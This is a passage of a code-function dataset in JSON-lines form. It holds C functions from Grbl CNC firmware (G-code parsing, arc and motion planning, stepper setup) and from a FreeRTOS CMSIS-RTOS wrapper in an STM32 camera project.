MOTION_MODE_CCW_ARC; break;\n#endif        \n        case 4: next_action = NEXT_ACTION_DWELL; break;\n        case 17: select_plane(X_AXIS, Y_AXIS, Z_AXIS); break;\n        case 18: select_plane(X_AXIS, Z_AXIS, Y_AXIS); break;\n        case 19: select_plane(Y_AXIS, Z_AXIS, X_AXIS); break;\n        case 20: gc.inches_mode = true; break;\n        case 21: gc.inches_mode = false; break;\n        case 28: case 30: next_action = NEXT_ACTION_GO_HOME; break;\n        case 53: absolute_override = true; break;\n        case 80: gc.motion_mode = MOTION_MODE_CANCEL; break;        \n        case 90: gc.absolute_mode = true; break;\n        case 91: gc.absolute_mode = false; break;\n        case 92: next_action = NEXT_ACTION_SET_COORDINATE_OFFSET; break;        \n        case 93: gc.inverse_feed_rate_mode = true; break;\n        case 94: gc.inverse_feed_rate_mode = false; break;\n        default: FAIL(STATUS_UNSUPPORTED_STATEMENT);\n      }\n      break;\n      \n      case 'M':\n      switch(int_value) {\n        case 0: case 1: gc.program_flow = PROGRAM_FLOW_PAUSED; break;\n        case 2: case 30: case 60: gc.program_flow = PROGRAM_FLOW_COMPLETED; break;\n        case 3: gc.spindle_direction = 1; break;\n        case 4: gc.spindle_direction = -1; break;\n        case 5: gc.spindle_direction = 0; break;\n        default: FAIL(STATUS_UNSUPPORTED_STATEMENT);\n      }            \n      break;\n      case 'T': gc.tool = trunc(value); break;\n    }\n    if(gc.status_code) { break; }\n  }\n  \n  // If there were any errors parsing this line, we will return right away with the bad news\n  if (gc.status_code) { return(gc.status_code); }\n\n  char_counter = 0;\n  clear_vector(offset);\n  memcpy(target, gc.position, sizeof(target)); // i.e. target = gc.position\n\n  // Pass 2: Parameters\n  while(next_statement(&letter, &value, line, &char_counter)) {\n    int_value = trunc(value);\n    unit_converted_value = to_millimeters(value);\n    switch(letter) {\n      case 'F': \n      if (gc.inverse_feed_rate_mode) {\n        inverse_feed_rate = unit_converted_value; // seconds per motion for this motion only\n      } else {          \n        if (gc.motion_mode == MOTION_MODE_SEEK) {\n          gc.seek_rate = unit_converted_value/60;\n        } else {\n          gc.feed_rate = unit_converted_value/60; // millimeters pr second\n        }\n      }\n      break;\n      case 'I': case 'J': case 'K': offset[letter-'I'] = unit_converted_value; break;\n      case 'P': p = value; break;\n      case 'R': r = unit_converted_value; radius_mode = true; break;\n      case 'S': gc.spindle_speed = value; break;\n      case 'X': case 'Y': case 'Z':\n      if (gc.absolute_mode || absolute_override) {\n        target[letter - 'X'] = unit_converted_value;\n      } else {\n        target[letter - 'X'] += unit_converted_value;\n      }\n      break;\n    }\n  }\n  \n  // If there were any errors parsing this line, we will return right away with the bad news\n  if (gc.status_code) { return(gc.status_code); }\n    \n  // Update spindle state\n  spindle_run(gc.spindle_direction, gc.spindle_speed);\n  \n  // Perform any physical actions\n  switch (next_action) {\n    case NEXT_ACTION_GO_HOME: mc_go_home(); clear_vector(gc.position); break;\n    case NEXT_ACTION_DWELL: mc_dwell(trunc(p*1000)); break;   \n    case NEXT_ACTION_SET_COORDINATE_OFFSET: \n    mc_set_current_position(target[X_AXIS], target[Y_AXIS], target[Z_AXIS]);\n    break;\n    case NEXT_ACTION_DEFAULT: \n    switch (gc.motion_mode) {\n      case MOTION_MODE_CANCEL: break;\n      case MOTION_MODE_SEEK:\n      mc_line(target[X_AXIS], target[Y_AXIS], target[Z_AXIS], gc.seek_rate, false);\n      break;\n      case MOTION_MODE_LINEAR:\n      mc_line(target[X_AXIS], target[Y_AXIS], target[Z_AXIS], \n        (gc.inverse_feed_rate_mode) ? inverse_feed_rate : gc.feed_rate, gc.inverse_feed_rate_mode);\n      break;\n#ifdef __AVR_ATmega328P__\n      case MOTION_MODE_CW_ARC: case MOTION_MODE_CCW_ARC:\n      if (radius_mode) {\n        /* \n          We need to calculate the center of the circle that has the designated radius and passes\n          through both the current position and the target position. This method calculates the following\n          set of equations where [x,y] is the vector from current to target position, d == magnitude of \n          that vector, h == hypotenuse of the triangle formed by the radius of the circle, the distance to\n          the center of the travel vector. A vector perpendicular to the travel vector [-y,x] is scaled to the \n          length of h [-y/d*h, x/d*h] and added to the center of the travel vector [x/2,y/2] to form the new point \n          [i,j] at [x/2-y/d*h, y/2+x/d*h] which will be the center of our arc.\n          \n          d^2 == x^2 + y^2\n          h^2 == r^2 - (d/2)^2\n          i == x/2 - y/d*h\n          j == y/2 + x/d*h\n          \n                                                               O <- [i,j]\n                                                            -  |\n                                                  r      -     |\n                                                      -        |\n                                                   -           | h\n                                                -              |\n                                  [0,0] ->  C -----------------+--------------- T  <- [x,y]\n                                            | <------ d/2 ---->|\n                    \n          C - Current position\n          T - Target position\n          O - center of circle that pass through both C and T\n          d - distance from C to T\n          r - designated radius\n          h - distance from center of CT to O\n          \n          Expanding the equations:\n\n          d -> sqrt(x^2 + y^2)\n          h -> sqrt(4 * r^2 - x^2 - y^2)/2\n          i -> (x - (y * sqrt(4 * r^2 - x^2 - y^2)) / sqrt(x^2 + y^2)) / 2 \n          j -> (y + (x * sqrt(4 * r^2 - x^2 - y^2)) / sqrt(x^2 + y^2)) / 2\n         \n          Which can be written:\n          \n          i -> (x - (y * sqrt(4 * r^2 - x^2 - y^2))/sqrt(x^2 + y^2))/2\n          j -> (y + (x * sqrt(4 * r^2 - x^2 - y^2))/sqrt(x^2 + y^2))/2\n          \n          Which we for size and speed reasons optimize to:\n\n          h_x2_div_d = sqrt(4 * r^2 - x^2 - y^2)/sqrt(x^2 + y^2)\n          i = (x - (y * h_x2_div_d))/2\n          j = (y + (x * h_x2_div_d))/2\n          \n        */\n        \n        // Calculate the change in position along each selected axis\n        double x = target[gc.plane_axis_0]-gc.position[gc.plane_axis_0];\n        double y = target[gc.plane_axis_1]-gc.position[gc.plane_axis_1];\n        \n        clear_vector(offset);\n        double h_x2_div_d = -sqrt(4 * r*r - x*x - y*y)/hypot(x,y); // == -(h * 2 / d)\n        // If r is smaller than d, the arc is now traversing the complex plane beyond the reach of any\n        // real CNC, and thus - for practical reasons - we will terminate promptly:\n        if(isnan(h_x2_div_d)) { FAIL(STATUS_FLOATING_POINT_ERROR); return(gc.status_code); }\n        // Invert the sign of h_x2_div_d if the circle is counter clockwise (see sketch below)\n        if (gc.motion_mode == MOTION_MODE_CCW_ARC) { h_x2_div_d = -h_x2_div_d; }\n        \n        /* The counter clockwise circle lies to the left of the target direction. When offset is positive,\n           the left hand circle will be generated - when it is negative the right hand circle is generated.\n           \n           \n                                                         T  <-- Target position\n                                                         \n                                                         ^ \n              Clockwise circles with this center         |          Clockwise circles with this center will have\n              will have > 180 deg of angular travel      |          < 180 deg of angular travel, which is a good thing!\n                                               \\         |          /   \n  center of arc when h_x2_div_d is positive ->  x <----- | -----> x <- center of arc when h_x2_div_d is negative\n                                                         |\n                                                         |\n                                                         \n                                                         C  <-- Current position                                 */\n                \n\n        // Negative R is g-code-alese for \"I want a circle with more than 180 degrees of travel\" (go figure!), \n        // even though it is advised against ever generating such circles in a single line of g-code. By \n        // inverting the sign of h_x2_div_d the center of the circles is placed on the opposite side of the line of\n        // travel and thus we get the unadvisably long arcs as prescribed.\n        if (r < 0) { h_x2_div_d = -h_x2_div_d; }        \n        // Complete the operation by calculating the actual center of the arc\n        offset[gc.plane_axis_0] = (x-(y*h_x2_div_d))/2;\n        offset[gc.plane_axis_1] = (y+(x*h_x2_div_d))/2;\n      } \n      \n      /*\n         This segment sets up an clockwise or counterclockwise arc from the current position to the target position around \n         the center designated by the offset vector. All theta-values measured in radians of deviance from the positive \n         y-axis. \n\n                            | <- theta == 0\n                          * * *                \n                        *       *                                               \n                      *           *                                             \n                      *     O ----T   <- theta_end (e.g. 90 degrees: theta_end == PI/2)                                          \n                      *   /                                                     \n                        C   <- theta_start (e.g. -145 degrees: theta_start == -PI*(3/4))\n\n      */\n            \n      // calculate the theta (angle) of the current point\n      double theta_start = theta(-offset[gc.plane_axis_0], -offset[gc.plane_axis_1]);\n      // calculate the theta (angle) of the target point\n      double theta_end = theta(target[gc.plane_axis_0] - offset[gc.plane_axis_0] - gc.position[gc.plane_axis_0], \n         target[gc.plane_axis_1] - offset[gc.plane_axis_1] - gc.position[gc.plane_axis_1]);\n      // ensure that the difference is positive so that we have clockwise travel\n      if (theta_end < theta_start) { theta_end += 2*M_PI; }\n      double angular_travel = theta_end-theta_start;\n      // Invert angular motion if the g-code wanted a counterclockwise arc\n      if (gc.motion_mode == MOTION_MODE_CCW_ARC) {\n        angular_travel = angular_travel-2*M_PI;\n      }\n      // Find the radius\n      double radius = hypot(offset[gc.plane_axis_0], offset[gc.plane_axis_1]);\n      // Calculate the motion along the depth axis of the helix\n      double depth = target[gc.plane_axis_2]-gc.position[gc.plane_axis_2];\n      // Trace the arc\n      mc_arc(theta_start, angular_travel, radius, depth, gc.plane_axis_0, gc.plane_axis_1, gc.plane_axis_2, \n        (gc.inverse_feed_rate_mode) ? inverse_feed_rate : gc.feed_rate, gc.inverse_feed_rate_mode,\n        gc.position);\n      // Finish off with a line to make sure we arrive exactly where we think we are\n      mc_line(target[X_AXIS], target[Y_AXIS], target[Z_AXIS], \n        (gc.inverse_feed_rate_mode) ? inverse_feed_rate : gc.feed_rate, gc.inverse_feed_rate_mode);\n      break;\n#endif      \n    }    \n  }\n  \n  // As far as the parser is concerned, the position is now == target. In reality the\n  // motion control system might still be processing the action and the real tool position\n  // in any intermediate location.\n  memcpy(gc.position, target, sizeof(double)*3); // gc.position[] = target[];\n  return(gc.status_code);\n}", "path": "firmware\\gcode.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Reset the planner position vector\n", "func_signal": "void plan_set_current_position(double x, double y, double z)", "code": "{\n  position[X_AXIS] = lround(x*settings.steps_per_mm[X_AXIS]);\n  position[Y_AXIS] = lround(y*settings.steps_per_mm[Y_AXIS]);\n  position[Z_AXIS] = lround(z*settings.steps_per_mm[Z_AXIS]);     \n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// The arc is approximated by generating a huge number of tiny, linear segments. The length of each \n// segment is configured in settings.mm_per_arc_segment.  \n", "func_signal": "void mc_arc(double theta, double angular_travel, double radius, double linear_travel, int axis_1, int axis_2, \n  int axis_linear, double feed_rate, int invert_feed_rate, double *position)", "code": "{      \n  int acceleration_manager_was_enabled = plan_is_acceleration_manager_enabled();\n  plan_set_acceleration_manager_enabled(false); // disable acceleration management for the duration of the arc\n  double millimeters_of_travel = hypot(angular_travel*radius, labs(linear_travel));\n  if (millimeters_of_travel == 0.0) { return; }\n  uint16_t segments = round(millimeters_of_travel/settings.mm_per_arc_segment);\n  // Multiply inverse feed_rate to compensate for the fact that this movement is approximated\n  // by a number of discrete segments. The inverse feed_rate should be correct for the sum of \n  // all segments.\n  if (invert_feed_rate) { feed_rate *= segments; }\n  // The angular motion for each segment\n  double theta_per_segment = angular_travel/segments;\n  // The linear motion for each segment\n  double linear_per_segment = linear_travel/segments;\n  // Compute the center of this circle\n  double center_x = position[axis_1]-sin(theta)*radius;\n  double center_y = position[axis_2]-cos(theta)*radius;\n  // a vector to track the end point of each segment\n  double target[3];\n  int i;\n  // Initialize the linear axis\n  target[axis_linear] = position[axis_linear];\n  for (i=0; i<segments; i++) {\n    target[axis_linear] += linear_per_segment;\n    theta += theta_per_segment;\n    target[axis_1] = center_x+sin(theta)*radius;\n    target[axis_2] = center_y+cos(theta)*radius;\n    plan_buffer_line(target[X_AXIS], target[Y_AXIS], target[Z_AXIS], feed_rate, invert_feed_rate);\n  }\n  plan_set_acceleration_manager_enabled(acceleration_manager_was_enabled);\n}", "path": "firmware\\motion_control.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Calculate a braking factor to reach baseline speed which is max_jerk/2, e.g. the \n// speed under which you cannot exceed max_jerk no matter what you do.\n", "func_signal": "static double factor_for_safe_speed(block_t *block)", "code": "{\n  if(settings.max_jerk < block->nominal_speed) {\n    return(settings.max_jerk/block->nominal_speed);  \n  } else {\n    return(1.0);\n  }\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Recalculates the motion plan according to the following algorithm:\n//\n//   1. Go over every block in reverse order and calculate a junction speed reduction (i.e. block_t.entry_factor) \n//      so that:\n//     a. The junction jerk is within the set limit\n//     b. No speed reduction within one block requires faster deceleration than the one, true constant \n//        acceleration.\n//   2. Go over every block in chronological order and dial down junction speed reduction values if \n//     a. The speed increase within one block would require faster accelleration than the one, true \n//        constant acceleration.\n//\n// When these stages are complete all blocks have an entry_factor that will allow all speed changes to \n// be performed using only the one, true constant acceleration, and where no junction jerk is jerkier than \n// the set limit. Finally it will:\n//\n//   3. Recalculate trapezoids for all blocks.\n", "func_signal": "static void planner_recalculate()", "code": "{     \n  planner_reverse_pass();\n  planner_forward_pass();\n  planner_recalculate_trapezoids();\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Calculates trapezoid parameters so that the entry- and exit-speed is compensated by the provided factors.\n// The factors represent a factor of braking and must be in the range 0.0-1.0.\n", "func_signal": "static void calculate_trapezoid_for_block(block_t *block, double entry_factor, double exit_factor)", "code": "{\n  block->initial_rate = ceil(block->nominal_rate*entry_factor);\n  block->final_rate = ceil(block->nominal_rate*exit_factor);\n  int32_t acceleration_per_minute = block->rate_delta*ACCELERATION_TICKS_PER_SECOND*60.0;\n  int32_t accelerate_steps = \n    ceil(estimate_acceleration_distance(block->initial_rate, block->nominal_rate, acceleration_per_minute));\n  int32_t decelerate_steps = \n    floor(estimate_acceleration_distance(block->nominal_rate, block->final_rate, -acceleration_per_minute));\n\n  // Calculate the size of Plateau of Nominal Rate. \n  int32_t plateau_steps = block->step_event_count-accelerate_steps-decelerate_steps;\n  \n  // Is the Plateau of Nominal Rate smaller than nothing? That means no cruising, and we will\n  // have to use intersection_distance() to calculate when to abort acceleration and start braking \n  // in order to reach the final_rate exactly at the end of this block.\n  if (plateau_steps < 0) {  \n    accelerate_steps = ceil(\n      intersection_distance(block->initial_rate, block->final_rate, acceleration_per_minute, block->step_event_count));\n    plateau_steps = 0;\n  }  \n  \n  block->accelerate_until = accelerate_steps;\n  block->decelerate_after = accelerate_steps+plateau_steps;\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Find the angle in radians of deviance from the positive y axis. negative angles to the left of y-axis, \n// positive to the right.\n", "func_signal": "static double theta(double x, double y)", "code": "{\n  double theta = atan(x/fabs(y));\n  if (y>0) {\n    return(theta);\n  } else {\n    if (theta>0) \n    {\n      return(M_PI-theta);\n    } else {\n      return(-M_PI-theta);\n    }\n  }\n}", "path": "firmware\\gcode.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Initialize and start the stepper motor subsystem\n", "func_signal": "void st_init()", "code": "{\n\t// Configure directions of interface pins\n  STEPPING_DDR   |= STEPPING_MASK;\n  STEPPING_PORT = (STEPPING_PORT & ~STEPPING_MASK) | settings.invert_mask;\n  STEPPERS_ENABLE_DDR |= 1<<STEPPERS_ENABLE_BIT;\n  \n\t// waveform generation = 0100 = CTC\n\tTCCR1B &= ~(1<<WGM13);\n\tTCCR1B |=  (1<<WGM12);\n\tTCCR1A &= ~(1<<WGM11); \n\tTCCR1A &= ~(1<<WGM10);\n\n\t// output mode = 00 (disconnected)\n\tTCCR1A &= ~(3<<COM1A0); \n\tTCCR1A &= ~(3<<COM1B0); \n\t\n\t// Configure Timer 2\n  TCCR2A = 0;         // Normal operation\n  TCCR2B = (1<<CS21); // Full speed, 1/8 prescaler\n  TIMSK2 |= (1<<TOIE2);      \n  \n  set_step_events_per_minute(6000);\n  trapezoid_tick_cycle_counter = 0;\n  st_disable_steppers();\t//@grblshield@/\t\n//  STEPPERS_ENABLE_PORT &= ~(1<<STEPPERS_ENABLE_BIT);\n//  DISABLE_STEPPER_DRIVER_INTERRUPT();  \n       \n  sei();\n}", "path": "firmware\\stepper.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Print a string stored in PGM-memory\n", "func_signal": "void printPgmString(const char *s)", "code": "{\n  char c;\n\twhile ((c = pgm_read_byte_near(s++)))\n\t\tprintByte(c);\n}", "path": "firmware\\wiring_serial.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// planner_recalculate() needs to go over the current plan twice. Once in reverse and once forward. This \n// implements the forward pass.\n", "func_signal": "static void planner_forward_pass()", "code": "{\n  int8_t block_index = block_buffer_tail;\n  block_t *block[3] = {NULL, NULL, NULL};\n  \n  while(block_index != block_buffer_head) {\n    block[0] = block[1];\n    block[1] = block[2];\n    block[2] = &block_buffer[block_index];\n    planner_forward_pass_kernel(block[0],block[1],block[2]);\n    block_index = (block_index+1) % BLOCK_BUFFER_SIZE;\n  }\n  planner_forward_pass_kernel(block[1], block[2], NULL);\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// The kernel called by planner_recalculate() when scanning the plan from first to last entry.\n", "func_signal": "static void planner_forward_pass_kernel(block_t *previous, block_t *current, block_t *next)", "code": "{\n  if(!current) { return; }\n  // If the previous block is an acceleration block, but it is not long enough to \n  // complete the full speed change within the block, we need to adjust out entry\n  // speed accordingly. Remember current->entry_factor equals the exit factor of \n  // the previous block.\n  if(previous->entry_factor < current->entry_factor) {\n    double max_entry_speed = max_allowable_speed(-settings.acceleration,\n      current->nominal_speed*previous->entry_factor, previous->millimeters);\n    double max_entry_factor = max_entry_speed/current->nominal_speed;\n    if (max_entry_factor < current->entry_factor) {\n      current->entry_factor = max_entry_factor;\n    }\n  }\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Add a new linear movement to the buffer. steps_x, _y and _z is the absolute position in \n// mm. Microseconds specify how many microseconds the move should take to perform. To aid acceleration\n// calculation the caller must also provide the physical length of the line in millimeters.\n", "func_signal": "void plan_buffer_line(double x, double y, double z, double feed_rate, int invert_feed_rate)", "code": "{\n  // The target position of the tool in absolute steps\n  \n  // Calculate target position in absolute steps\n  int32_t target[3];\n  target[X_AXIS] = lround(x*settings.steps_per_mm[X_AXIS]);\n  target[Y_AXIS] = lround(y*settings.steps_per_mm[Y_AXIS]);\n  target[Z_AXIS] = lround(z*settings.steps_per_mm[Z_AXIS]);     \n  \n  // Calculate the buffer head after we push this byte\n\tint next_buffer_head = (block_buffer_head + 1) % BLOCK_BUFFER_SIZE;\t\n\t// If the buffer is full: good! That means we are well ahead of the robot. \n\t// Rest here until there is room in the buffer.\n  while(block_buffer_tail == next_buffer_head) { sleep_mode(); }\n  // Prepare to set up new block\n  block_t *block = &block_buffer[block_buffer_head];\n  // Number of steps for each axis\n  block->steps_x = labs(target[X_AXIS]-position[X_AXIS]);\n  block->steps_y = labs(target[Y_AXIS]-position[Y_AXIS]);\n  block->steps_z = labs(target[Z_AXIS]-position[Z_AXIS]);\n  block->step_event_count = max(block->steps_x, max(block->steps_y, block->steps_z));\n  // Bail if this is a zero-length block\n  if (block->step_event_count == 0) { return; };\n  \n  double delta_x_mm = (target[X_AXIS]-position[X_AXIS])/settings.steps_per_mm[X_AXIS];\n  double delta_y_mm = (target[Y_AXIS]-position[Y_AXIS])/settings.steps_per_mm[Y_AXIS];\n  double delta_z_mm = (target[Z_AXIS]-position[Z_AXIS])/settings.steps_per_mm[Z_AXIS];\n  block->millimeters = sqrt(square(delta_x_mm) + square(delta_y_mm) + square(delta_z_mm));\n\t\n  \n  uint32_t microseconds;\n  if (!invert_feed_rate) {\n    microseconds = lround((block->millimeters/feed_rate)*1000000);\n  } else {\n    microseconds = lround(ONE_MINUTE_OF_MICROSECONDS/feed_rate);\n  }\n  \n  // Calculate speed in mm/minute for each axis\n  double multiplier = 60.0*1000000.0/microseconds;\n  block->speed_x = delta_x_mm * multiplier;\n  block->speed_y = delta_y_mm * multiplier;\n  block->speed_z = delta_z_mm * multiplier; \n  block->nominal_speed = block->millimeters * multiplier;\n  block->nominal_rate = ceil(block->step_event_count * multiplier);  \n  block->entry_factor = 0.0;\n  \n  // Compute the acceleration rate for the trapezoid generator. Depending on the slope of the line\n  // average travel per step event changes. For a line along one axis the travel per step event\n  // is equal to the travel/step in the particular axis. For a 45 degree line the steppers of both\n  // axes might step for every step event. Travel per step event is then sqrt(travel_x^2+travel_y^2).\n  // To generate trapezoids with contant acceleration between blocks the rate_delta must be computed \n  // specifically for each line to compensate for this phenomenon:\n  double travel_per_step = block->millimeters/block->step_event_count;\n  block->rate_delta = ceil(\n    ((settings.acceleration*60.0)/(ACCELERATION_TICKS_PER_SECOND))/ // acceleration mm/sec/sec per acceleration_tick\n    travel_per_step);                                               // convert to: acceleration steps/min/acceleration_tick    \n  if (acceleration_manager_enabled) {\n    // compute a preliminary conservative acceleration trapezoid\n    double safe_speed_factor = factor_for_safe_speed(block);\n    calculate_trapezoid_for_block(block, safe_speed_factor, safe_speed_factor); \n  } else {\n    block->initial_rate = block->nominal_rate;\n    block->final_rate = block->nominal_rate;\n    block->accelerate_until = 0;\n    block->decelerate_after = block->step_event_count;\n    block->rate_delta = 0;\n  }\n  \n  // Compute direction bits for this block\n  block->direction_bits = 0;\n  if (target[X_AXIS] < position[X_AXIS]) { block->direction_bits |= (1<<X_DIRECTION_BIT); }\n  if (target[Y_AXIS] < position[Y_AXIS]) { block->direction_bits |= (1<<Y_DIRECTION_BIT); }\n  if (target[Z_AXIS] < position[Z_AXIS]) { block->direction_bits |= (1<<Z_DIRECTION_BIT); }\n  \n  // Move buffer head\n  block_buffer_head = next_buffer_head;     \n  // Update position \n  memcpy(position, target, sizeof(target)); // position[] = target[]\n  \n  if (acceleration_manager_enabled) { planner_recalculate(); }  \n  st_wake_up();\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// This is called ACCELERATION_TICKS_PER_SECOND times per second by the step_event\n// interrupt. It can be assumed that the trapezoid-generator-parameters and the\n// current_block stays untouched by outside handlers for the duration of this function call.\n", "func_signal": "static void trapezoid_generator_tick()", "code": "{     \n  if (current_block) {\n    if (step_events_completed < current_block->accelerate_until) {\n      trapezoid_adjusted_rate += current_block->rate_delta;\n      set_step_events_per_minute(trapezoid_adjusted_rate);\n    } else if (step_events_completed > current_block->decelerate_after) {\n      // NOTE: We will only reduce speed if the result will be > 0. This catches small\n      // rounding errors that might leave steps hanging after the last trapezoid tick.\n      if (trapezoid_adjusted_rate > current_block->rate_delta) {\n        trapezoid_adjusted_rate -= current_block->rate_delta;\n      }\n      if (trapezoid_adjusted_rate < current_block->final_rate) {\n        trapezoid_adjusted_rate = current_block->final_rate;\n      }        \n      set_step_events_per_minute(trapezoid_adjusted_rate);\n    } else {\n      // Make sure we cruise at exactly nominal rate\n      if (trapezoid_adjusted_rate != current_block->nominal_rate) {\n        trapezoid_adjusted_rate = current_block->nominal_rate;\n        set_step_events_per_minute(trapezoid_adjusted_rate);\n      }\n    }\n  }\n}", "path": "firmware\\stepper.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "/**\n* @brief  Start the RTOS Kernel with executing the specified thread.\n* @param  thread_def    thread definition referenced with \\ref osThread.\n* @param  argument      pointer that is passed to the thread function as start argument.\n* @retval status code that indicates the execution status of the function\n* @note   MUST REMAIN UNCHANGED: \\b osKernelStart shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osStatus osKernelStart (void)", "code": "{\n  vTaskStartScheduler();\n  \n  return osOK;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Resume execution of a all suspended threads.\n* @retval  status code that indicates the execution status of the function.\n*/\n", "func_signal": "osStatus osThreadResumeAll (void)", "code": "{\n  if (xTaskResumeAll() == pdTRUE)\n    return osOK;\n  else\n    return osErrorOS;\n  \n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Wait until a Semaphore token becomes available\n* @param  semaphore_id  semaphore object referenced with \\ref osSemaphore.\n* @param  millisec      timeout value or 0 in case of no time-out.\n* @retval  number of available tokens, or -1 in case of incorrect parameters.\n* @note   MUST REMAIN UNCHANGED: \\b osSemaphoreWait shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "int32_t osSemaphoreWait (osSemaphoreId semaphore_id, uint32_t millisec)", "code": "{\n  TickType_t ticks;\n  portBASE_TYPE taskWoken = pdFALSE;  \n  \n  \n  if (semaphore_id == NULL) {\n    return osErrorParameter;\n  }\n  \n  ticks = 0;\n  if (millisec == osWaitForever) {\n    ticks = portMAX_DELAY;\n  }\n  else if (millisec != 0) {\n    ticks = millisec / portTICK_PERIOD_MS;\n    if (ticks == 0) {\n      ticks = 1;\n    }\n  }\n  \n  if (inHandlerMode()) {\n    if (xSemaphoreTakeFromISR(semaphore_id, &taskWoken) != pdTRUE) {\n      return osErrorOS;\n    }\n\tportEND_SWITCHING_ISR(taskWoken);\n  }  \n  else if (xSemaphoreTake(semaphore_id, ticks) != pdTRUE) {\n    return osErrorOS;\n  }\n  \n  return osOK;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/***********************  Timer Management Functions ***************************/\n/**\n* @brief  Create a timer.\n* @param  timer_def     timer object referenced with \\ref osTimer.\n* @param  type          osTimerOnce for one-shot or osTimerPeriodic for periodic behavior.\n* @param  argument      argument to the timer call back function.\n* @retval  timer ID for reference by other functions or NULL in case of error.\n* @note   MUST REMAIN UNCHANGED: \\b osTimerCreate shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osTimerId osTimerCreate (const osTimerDef_t *timer_def, os_timer_type type, void *argument)", "code": "{\n#if (configUSE_TIMERS == 1)\n\n#if( ( configSUPPORT_STATIC_ALLOCATION == 1 ) && ( configSUPPORT_DYNAMIC_ALLOCATION == 1 ) ) \n  if(timer_def->controlblock != NULL) {\n    return xTimerCreateStatic((const char *)\"\",\n                      1, // period should be filled when starting the Timer using osTimerStart\n                      (type == osTimerPeriodic) ? pdTRUE : pdFALSE,\n                      (void *) argument,\n                      (TaskFunction_t)timer_def->ptimer,\n                      (StaticTimer_t *)timer_def->controlblock);\n  }\n  else {\n    return xTimerCreate((const char *)\"\",\n                      1, // period should be filled when starting the Timer using osTimerStart\n                      (type == osTimerPeriodic) ? pdTRUE : pdFALSE,\n                      (void *) argument,\n                      (TaskFunction_t)timer_def->ptimer);\n }\n#elif( configSUPPORT_STATIC_ALLOCATION == 1 )\n  return xTimerCreateStatic((const char *)\"\",\n                      1, // period should be filled when starting the Timer using osTimerStart\n                      (type == osTimerPeriodic) ? pdTRUE : pdFALSE,\n                      (void *) argument,\n                      (TaskFunction_t)timer_def->ptimer,\n                      (StaticTimer_t *)timer_def->controlblock);  \n#else\n  return xTimerCreate((const char *)\"\",\n                      1, // period should be filled when starting the Timer using osTimerStart\n                      (type == osTimerPeriodic) ? pdTRUE : pdFALSE,\n                      (void *) argument,\n                      (TaskFunction_t)timer_def->ptimer);\n#endif\n\n#else \n\treturn NULL;\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Stop a timer.\n* @param  timer_id      timer ID obtained by \\ref osTimerCreate\n* @retval  status code that indicates the execution status of the function.\n* @note   MUST REMAIN UNCHANGED: \\b osTimerStop shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osStatus osTimerStop (osTimerId timer_id)", "code": "{\n  osStatus result = osOK;\n#if (configUSE_TIMERS == 1)  \n  portBASE_TYPE taskWoken = pdFALSE;\n\n  if (inHandlerMode()) {\n    if (xTimerStopFromISR(timer_id, &taskWoken) != pdPASS) {\n      return osErrorOS;\n    }\n    portEND_SWITCHING_ISR(taskWoken);\n  }\n  else {\n    if (xTimerStop(timer_id, 0) != pdPASS) {\n      result = osErrorOS;\n    }\n  }\n#else \n  result = osErrorOS;\n#endif \n  return result;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
